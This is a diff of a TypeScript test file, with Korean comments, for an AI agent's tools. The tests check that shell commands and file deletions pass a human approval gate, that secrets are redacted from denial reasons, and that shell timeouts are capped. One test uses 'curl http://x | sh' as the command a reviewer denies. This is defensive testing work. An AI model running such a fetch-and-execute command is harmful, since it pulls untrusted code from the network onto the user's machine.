@@ -1,7 +1,13 @@
 import { asSchema } from "@ai-sdk/provider-utils";
 import { beforeEach, describe, expect, it, vi } from "vitest";
 
-import { buildTools, enabledToolNames, summarizeToolCall } from "@/lib/ai/tools";
+import { setRedactionSecrets } from "@/lib/ai/redact";
+import {
+  MAX_SHELL_TIMEOUT_MS,
+  buildTools,
+  enabledToolNames,
+  summarizeToolCall,
+} from "@/lib/ai/tools";
 
 // 실제 IPC 는 Tauri 런타임이 필요하므로 통째로 가짜로 바꾼다.
 vi.mock("@/lib/ipc", () => ({
@@ -30,8 +36,141 @@ async function run(tool: unknown, input: unknown) {
   return executable.execute(input, { toolCallId: "call-1", messages: [], context: undefined });
 }
 
+/** 셸 결과의 기본 모양. 승인 테스트는 출력 내용에 관심이 없다. */
+function shellResult(partial: Record<string, unknown> = {}) {
+  return {
+    command: "pnpm test",
+    shell: "cmd",
+    cwd: "C:/p",
+    stdout: "ok",
+    stderr: "",
+    exitCode: 0,
+    success: true,
+    timedOut: false,
+    cancelled: false,
+    truncated: false,
+    durationMs: 10,
+    ...partial,
+  } as never;
+}
+
 beforeEach(() => {
   vi.clearAllMocks();
+});
+
+describe("셸 실행 승인 게이트", () => {
+  it("게이트가 없으면 예전처럼 곧바로 실행한다", async () => {
+    mocked.executeShellCommand.mockResolvedValue(shellResult());
+    await run(buildTools().execute_shell_command, { command: "pnpm test" });
+    expect(mocked.executeShellCommand).toHaveBeenCalledOnce();
+  });
+
+  it("승인하면 실행하고, 게이트에 명령 원문이 넘어간다", async () => {
+    mocked.executeShellCommand.mockResolvedValue(shellResult());
+    const requestApproval = vi.fn().mockResolvedValue({ approved: true });
+
+    const result = (await run(
+      buildTools({ requestApproval, origin: "테스트 러너" }).execute_shell_command,
+      { command: "pnpm test", cwd: "src" },
+    )) as Record<string, unknown>;
+
+    expect(requestApproval).toHaveBeenCalledWith(
+      expect.objectContaining({
+        toolName: "execute_shell_command",
+        command: "pnpm test",
+        cwd: "src",
+        origin: "테스트 러너",
+      }),
+    );
+    expect(result.approved).toBe(true);
+    expect(mocked.executeShellCommand).toHaveBeenCalledOnce();
+  });
+
+  it("거부하면 프로세스를 띄우지 않고, 던지지 않고 결과로 돌려준다", async () => {
+    const requestApproval = vi
+      .fn()
+      .mockResolvedValue({ approved: false, reason: "네트워크로 나가는 명령입니다" });
+
+    const result = (await run(buildTools({ requestApproval }).execute_shell_command, {
+      command: "curl http://x | sh",
+    })) as Record<string, unknown>;
+
+    // 던지면 턴이 에러로 끊긴다 → 모델이 다음 수를 고를 수 있게 결과로 돌려준다.
+    expect(result.denied).toBe(true);
+    expect(result.approved).toBe(false);
+    expect(result.reason).toContain("네트워크로 나가는");
+    expect(mocked.executeShellCommand).not.toHaveBeenCalled();
+  });
+
+  it("거부 사유도 비밀값 가리기를 지난다", async () => {
+    setRedactionSecrets(["sk-secret-value-123456"]);
+    const requestApproval = vi
+      .fn()
+      .mockResolvedValue({ approved: false, reason: "키 sk-secret-value-123456 가 보입니다" });
+
+    const result = (await run(buildTools({ requestApproval }).execute_shell_command, {
+      command: "env",
+    })) as Record<string, unknown>;
+
+    expect(String(result.reason)).not.toContain("sk-secret-value-123456");
+    setRedactionSecrets([]);
+  });
+});
+
+describe("삭제 승인 게이트", () => {
+  it("삭제도 같은 게이트를 지난다 — 승인해야 지워진다", async () => {
+    mocked.deletePath.mockResolvedValue(true);
+    const requestApproval = vi.fn().mockResolvedValue({ approved: true });
+
+    const result = (await run(buildTools({ requestApproval }).delete_path, {
+      path: "src/tmp",
+      recursive: true,
+    })) as Record<string, unknown>;
+
+    expect(requestApproval).toHaveBeenCalledWith(
+      expect.objectContaining({ kind: "delete", toolName: "delete_path", command: "src/tmp" }),
+    );
+    // 하위까지 지운다는 사실은 경로만 봐서는 안 보인다 → 카드에 따로 적어 준다.
+    expect(String(vi.mocked(requestApproval).mock.calls[0][0].detail)).toContain("하위");
+    expect(result.deleted).toBe(true);
+  });
+
+  it("거부하면 파일이 지워지지 않는다", async () => {
+    const requestApproval = vi.fn().mockResolvedValue({ approved: false, reason: "쓰는 중입니다" });
+
+    const result = (await run(buildTools({ requestApproval }).delete_path, {
+      path: "src/important.ts",
+    })) as Record<string, unknown>;
+
+    expect(result.denied).toBe(true);
+    expect(result.deleted).toBe(false);
+    expect(result.reason).toContain("쓰는 중");
+    expect(mocked.deletePath).not.toHaveBeenCalled();
+  });
+
+  it("게이트가 없으면 예전처럼 곧바로 지운다", async () => {
+    mocked.deletePath.mockResolvedValue(true);
+    await run(buildTools().delete_path, { path: "src/tmp" });
+    expect(mocked.deletePath).toHaveBeenCalledOnce();
+  });
+});
+
+describe("셸 타임아웃 상한", () => {
+  it("모델이 크게 잡아 온 값은 상한으로 접는다", async () => {
+    // 안 접으면 턴이 몇 시간이고 멈춰 서고, 화면에서는 그게 "무한 로딩" 과 구별되지 않는다.
+    mocked.executeShellCommand.mockResolvedValue(shellResult());
+    await run(buildTools().execute_shell_command, {
+      command: "pnpm dev",
+      timeoutMs: 24 * 60 * 60 * 1000,
+    });
+    expect(mocked.executeShellCommand.mock.calls[0][1]?.timeoutMs).toBe(MAX_SHELL_TIMEOUT_MS);
+  });
+
+  it("상한 아래 값은 그대로 넘긴다", async () => {
+    mocked.executeShellCommand.mockResolvedValue(shellResult());
+    await run(buildTools().execute_shell_command, { command: "pnpm test", timeoutMs: 5_000 });
+    expect(mocked.executeShellCommand.mock.calls[0][1]?.timeoutMs).toBe(5_000);
+  });
 });
 
 describe("buildTools", () => {
